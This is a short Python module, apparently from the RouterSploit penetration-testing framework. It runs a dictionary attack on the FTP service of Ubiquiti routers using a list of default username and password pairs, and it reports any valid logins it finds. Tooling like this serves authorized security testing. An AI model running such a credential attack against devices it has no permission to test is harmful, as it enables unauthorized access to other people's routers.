from routersploit.core.exploit import *
from routersploit.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Ubiquiti Router Default FTP Creds",
        "description": "Module performs dictionary attack against Ubiquiti Router FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Ubiquiti Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin,root:ubnt,ubnt:ubnt", "User:Pass or file with default credentials (file://)")
